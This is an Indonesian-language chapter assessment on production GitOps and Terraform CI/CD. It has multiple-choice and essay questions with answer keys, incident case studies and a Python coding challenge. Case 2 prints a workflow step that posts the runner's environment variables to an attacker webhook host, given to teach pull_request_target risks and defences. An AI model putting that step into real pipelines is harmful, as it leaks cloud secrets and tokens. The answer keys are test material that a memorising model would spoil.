# Evaluasi Bab 08: Production GitOps & Enterprise CI/CD Automation

## 1. Basic Questions (Pilihan Ganda & Analisis Singkat)

### Soal 1
Apa perbedaan mendasar antara *Speculative Plan* dan *Real Apply* dalam alur kerja GitOps Terraform?
A. Speculative plan hanya mengecek sintaksis HCL, sedangkan real apply menjalankan validasi provider.  
B. Speculative plan menghasilkan diff prediksi terhadap merge ref cabang fitur tanpa mengeksekusi mutasi atau mengubah remote state; real apply menerapkan binary plan yang telah disetujui ke infrastruktur nyata.  
C. Speculative plan dijalankan di laptop developer, sedangkan real apply dijalankan di GitHub Actions.  
D. Speculative plan menyimpan state file baru di local storage, sedangkan real apply menyimpannya di cloud storage.  

*Jawaban*: **B**  
*Penjelasan*: Speculative plan dirancang murni untuk evaluasi non-destruktif selama proses review PR. State file di remote backend sama sekali tidak diubah.

---

### Soal 2
Mengapa penggunaan OpenID Connect (OIDC) lebih direkomendasikan daripada menyimpan static Access Keys di GitHub Actions Secrets untuk pipeline Terraform enterprise?
A. OIDC mempercepat waktu inisialisasi Terraform CLI hingga 50%.  
B. OIDC tidak memerlukan koneksi internet untuk mengautentikasi AWS STS.  
C. OIDC menghilangkan kebutuhan menyimpan token jangka panjang (long-lived secrets) dengan menukar token identitas jangka pendek berklaim granular (seperti branch dan repo name).  
D. OIDC memungkinkan bypass terhadap permission boundary IAM.  

*Jawaban*: **C**  
*Penjelasan*: OIDC menerbitkan token JWT ephemeral yang divalidasi oleh cloud provider STS, meniadakan risiko tereksposnya access key statis yang sering lupa dirotasi.

---

### Soal 3
Perintah `terraform plan -detailed-exitcode` menghasilkan exit code bernilai integer. Apa makna fungsional dari exit code bernilai `2`?
A. Eksekusi berhasil tanpa ada perubahan (diff infrastruktur kosong).  
B. Terjadi error sintaksis atau kegagalan inisialisasi backend.  
C. Eksekusi berhasil dan terdeteksi adanya perbedaan (diff) antara state dan konfigurasi/infrastruktur nyata.  
D. State lock gagal didapatkan karena race condition.  

*Jawaban*: **C**  
*Penjelasan*: Pada Terraform CLI, `exitcode 0` = no changes, `exitcode 1` = error fatal, dan `exitcode 2` = plan success with differences detected.

---

### Soal 4
Fitur apa pada Atlantis yang bertugas menghentikan developer lain memodifikasi working directory yang sama secara bersamaan di PR yang berbeda?
A. GitHub Merge Queue  
B. Atlantis Lock (Project Locking)  
C. Git Rebase Mutex  
D. Terraform Backend S3 Versioning  

*Jawaban*: **B**  
*Penjelasan*: Atlantis mengenakan project-level lock yang mengikat kombinasi repository, path directory, dan workspace ke nomor PR pemanggil sampai PR tersebut di-merge atau lock dibuka secara eksplisit.

---

### Soal 5
Pada GitHub Actions workflow, konfigurasi `concurrency: cancel-in-progress: false` paling krusial diterapkan pada job mana?
A. Job `terraform fmt`  
B. Job `terraform validate`  
C. Job `terraform apply`  
D. Job `tflint`  

*Jawaban*: **C**  
*Penjelasan*: Membatalkan (`cancel-in-progress: true`) job `terraform apply` yang sedang berjalan di tengah jalan dapat menyebabkan rusaknya status state, resource berstatus *tainted*, atau dangling cloud resources yang tidak terlacak.

---

## 2. Intermediate Questions (Analisis Konseptual)

### Soal 1
Jelaskan implikasi keamanan dari membiarkan runner CI/CD mempublikasikan hasil mentah `terraform plan` secara terbuka ke komentar Pull Request publik!  
*Jawaban*:  
File atau teks keluaran `terraform plan` dapat mengekspos data sensitif dalam bentuk plaintext, seperti initial password database, private keys, token autentikasi, dan CIDR block arsitektur jaringan privat. Solusi mitigasinya adalah menggunakan environment masking, menolak atribut sensitif tampil via wrapper redaction tools, atau membatasi eksekusi dan visibilitas komentar hanya pada private repository dengan role engineering tertentu.

---

### Soal 2
Dalam skenario CI/CD multi-environment dengan GitHub Actions, mengapa kita harus memisahkan job `apply-staging` dan `apply-production` menggunakan fitur GitHub Environments?  
*Jawaban*:  
GitHub Environments menyediakan fungsionalitas tata kelola tingkat enterprise:
1. **Required Reviewers (Approval Gates)**: Mencegah apply ke production tanpa persetujuan eksplisit dari pihak yang berwenang (misal: SRE Lead).
2. **Environment Secrets/OIDC Isolation**: Staging dan Production dapat mengasumsikan IAM Role yang sepenuhnya berbeda di level AWS Account yang terpisah secara fisik, mencegah kebocoran izin silang (cross-environment privilege escalation).
3. **Deployment Tracking**: GitHub menyediakan timeline audit yang jelas mengenai commit SHA mana yang sedang aktif di production vs staging.

---

### Soal 3
Bagaimana cara kerja arsitektur *Dynamic Worker Pools* pada TACOs seperti Spacelift/env0 jika dibandingkan dengan pendekatan GitHub Actions hosted runners terkait keamanan jaringan?  
*Jawaban*:  
Hosted runners milik GitHub berada di luar perimeter jaringan organisasi dan memerlukan IP whitelisting atau firewall traversal ke cloud target. Dynamic Private Worker Pools pada Spacelift/env0 ditempatkan langsung di dalam private VPC/subnet pengguna (via container atau VM). Worker ini hanya membuka koneksi *outbound* (pull model) via HTTPS/mTLS ke control plane SaaS, sehingga port inbound jaringan private tetap tertutup rapat dan runner memiliki akses internal langsung ke resource privat (misal: Kubernetes control plane internal atau Bastion).

---

### Soal 4
Apa langkah-langkah resolusi teknis jika cron pipeline Drift Detection mendeteksi perubahan manual pada resource production di luar kontrol Terraform?  
*Jawaban*:  
1. **Identifikasi Perubahan**: Analisis log output drift plan untuk melihat atribut yang bermutasi.
2. **Pilihan Kebijakan**:
   - *Opsi A (Reconciliation / Overwrite)*: Jika perubahan manual dianggap insiden atau pelanggaran keamanan, picu pipeline `terraform apply` untuk menimpa konfigurasi riil kembali ke state yang tercantum di Git.
   - *Opsi B (Reverse Import / Code Catch-Up)*: Jika perubahan manual adalah hotfix darurat yang disetujui, buat branch baru, sesuaikan kode HCL dengan nilai baru di cloud, jalankan PR review, dan sinkronkan state tanpa mengubah infrastruktur.

---

### Soal 5
Mengapa kita wajib melakukan *upload* dan *download artifact* terhadap file `.tfplan` di antara job `plan` dan job `apply`, alih-alih mengeksekusi ulang `terraform plan` di dalam job `apply`?  
*Jawaban*:  
Karena prinsip idempotensi dan determinisme. Ada jeda waktu (time-window) antara approval dan eksekusi apply. Jika `terraform apply` menjalankan plan baru, ada risiko bahwa state infrastruktur atau commit dependensi modul eksternal telah berubah di cloud, sehingga hal yang diterapkan ke production tidak lagi identik dengan apa yang telah diverifikasi dan disetujui oleh tim reviewer. Binary `.tfplan` mengunci rencana perubahan secara absolut.

---

## 3. Scenario-Based Questions (Studi Kasus Nyata)

### Kasus 1: Insiden State Lock Deadlock saat Release Produksi
*Skenario*:  
Tim Core Banking sedang merilis pembaruan arsitektur VPC via pipeline GitHub Actions. Saat job `apply-production` berjalan, runner tiba-tiba mengalami *spot instance termination* (infrastruktur runner mati mendadak). Job CI ditandai gagal. Ketika engineer mencoba men-trigger re-run workflow, muncul error fatal:
```text
Error: Error acquiring the state lock
Lock Info:
  ID:        a1b2c3d4-e5f6-7890-abcd-1234567890ab
  Path:      my-bucket-tfstate/production/terraform.tfstate
  Operation: OperationTypeApply
  Who:       runner@fv-az123-456
  Created:   2024-10-15 14:02:10.123456789 +0000 UTC
```
*Tugas Anda*: Tuliskan Standar Operasional Prosedur (SOP) langkah demi langkah untuk menyelesaikan insiden ini dengan aman tanpa merusak integritas database state!

*Panduan Solusi*:
1. **Verifikasi Keberadaan Proses Aktif**: Pastikan secara absolut bahwa runner `fv-az123-456` benar-benar sudah mati dan tidak ada proses background `terraform` yang sedang menulis state.
2. **Inspeksi Backend DynamoDB / State Storage**: Cek remote state S3 untuk memastikan tidak ada file `.tflock` liar atau payload state yang terpotong (cek ETag dan metadata).
3. **Eksekusi Force Unlock Terkendali**:
   - Jalankan perintah dengan identitas IAM admin yang berwenang:
     ```bash
     terraform force-unlock a1b2c3d4-e5f6-7890-abcd-1234567890ab
     ```
4. **Validasi State Refresh**: Jalankan `terraform refresh` atau `terraform plan` read-only untuk memverifikasi apakah remote state konsisten dengan infrastruktur AWS riil pasca pemutusan tiba-tiba.
5. **Re-trigger CI Workflow**: Picu pipeline normal kembali.

---

### Kasus 2: PR Hijacking dan Kebocoran Kredensial via Forked Repository
*Skenario*:  
Perusahaan Anda memiliki repositori modul IaC publik di GitHub. Seorang kontributor luar membuat PR yang memodifikasi workflow `.github/workflows/terraform-matrix.yml` dengan menambahkan baris:
```yaml
- name: Steal Tokens
  run: curl -d "$(env)" https://attacker-webhook.site/collect
```
Workflow dipicu oleh event `pull_request_target`.  
*Tugas Anda*: Jelaskan mengapa event `pull_request_target` berbahaya dalam skenario ini, apa potensi kerugian yang terjadi, dan bagaimana mendesain proteksi CI/CD agar attacker tidak dapat mencuri OIDC identity token atau secrets cloud Anda!

*Panduan Solusi*:
- **Penyebab Kerentanan**: `pull_request_target` berjalan dalam konteks repository target (base branch) dan memiliki akses ke repository secrets serta write permissions, namun mengeksekusi kode atau konteks dari PR forked yang belum diverifikasi.
- **Dampak**: Attacker dapat mengekstrak OIDC environment token atau API tokens yang tersimpan di secret context runner.
- **Rekomendasi Proteksi**:
  1. Ganti trigger event ke `pull_request` standar untuk public repo, yang secara default meniadakan akses ke secrets dan hanya memberikan read token.
  2. Batasi IAM Trust Policy AWS OIDC hanya menerima request dari base repository asli (`repo:my-org/my-repo:*`), bukan dari fork (`repo:attacker-org/my-repo:*`).
  3. Terapkan requirement: "Approval required for all outside collaborators before workflows run".

---

### Kasus 3: Multi-Region Pipeline Concurrency Collision
*Skenario*:  
Sebuah platform travel berskala global mengelola deployment Terraform multi-region (`us-east-1`, `eu-west-1`, `ap-southeast-1`) dalam satu repository monorepo. Ketika PR di-merge, GitHub Actions menjalankan matrix 3 region sekaligus. Namun, modul jaringan global (AWS Transit Gateway & Route53 Public Zones) mengalami error race condition karena ketiga region mencoba memodifikasi Peering Attachment Transit Gateway yang sama secara serentak.  
*Tugas Anda*: Rancang arsitektur pipeline dan struktur dependensi direktori Terraform yang mengeliminasi masalah konkurensi ini tanpa mematikan eksekusi paralel untuk resource non-dependen!

*Panduan Solusi*:
1. **Dekomposisi Stack (Decoupling)**:
   - Pisahkan stack menjadi dua level:
     - `global-foundation` (Transit Gateway, Route53, IAM Base).
     - `regional-workloads` (`us-east-1`, `eu-west-1`, `ap-southeast-1`).
2. **Pipeline Staging DAG (Directed Acyclic Graph)**:
   - Buat job GitHub Actions terpisah:
     - Job 1: `apply-global-foundation` (berjalan secara sekuensial, tunggal).
     - Job 2: `matrix-apply-regions` (memiliki konfigurasi `needs: [apply-global-foundation]`, berjalan paralel untuk ketiga region).
3. **Data Source / Remote State Dependency**:
   - `regional-workloads` membaca metadata Transit Gateway via `terraform_remote_state` data source secara read-only, sehingga tidak ada kompetisi penulisan state pada resource global.

---

## 4. Practical Chapter Challenge

### Judul Tantangan:
**Membangun Engine GitOps Mandiri Berbasis Event & Policy Guardrails**

### Spesifikasi Kebutuhan Teknis:
Anda ditugaskan oleh Chief Architect untuk membangun sistem automasi GitOps PR-validation engine sederhana yang mensimulasikan fungsionalitas Atlantis dan GitHub Actions Environment Approval Gates.

Implementasikan sistem dalam bentuk program CLI/skrip Python executable (`atlantis_gitops_pipeline_sim.py`) yang:
1. Membaca file konfigurasi pipeline (mendefinisikan role matrix, environment limits, dan policies).
2. Memproses simulasi PR events (Open PR, Comment Command `/plan`, Comment Command `/apply`, Cron Trigger).
3. Menjalankan mekanisme:
   - **Speculative Plan Simulation**: Menghitung delta resource (Add, Change, Destroy) dan memvalidasi guardrail (misal: destroy > 0 pada production membutuhkan persetujuan role `Lead-SRE`).
   - **Locking Engine**: Mengunci workspace secara in-memory/file-based saat plan dibuat. Melempar exception jika ada event PR lain mencoba mengakses workspace yang sedang terkunci.
   - **Role-Based Gate Check**: Memeriksa identitas user yang memicu apply terhadap approval policy yang tertera.
   - **Drift Simulation**: Fungsi cron yang membandingkan "actual live state" tiruan dengan "state file" tiruan dan melaporkan exit code `0` atau `2`.
4. Program harus memiliki logging yang bersih dan informatif, serta dapat dijalankan langsung dengan Python 3 tanpa external dependencies yang rumit.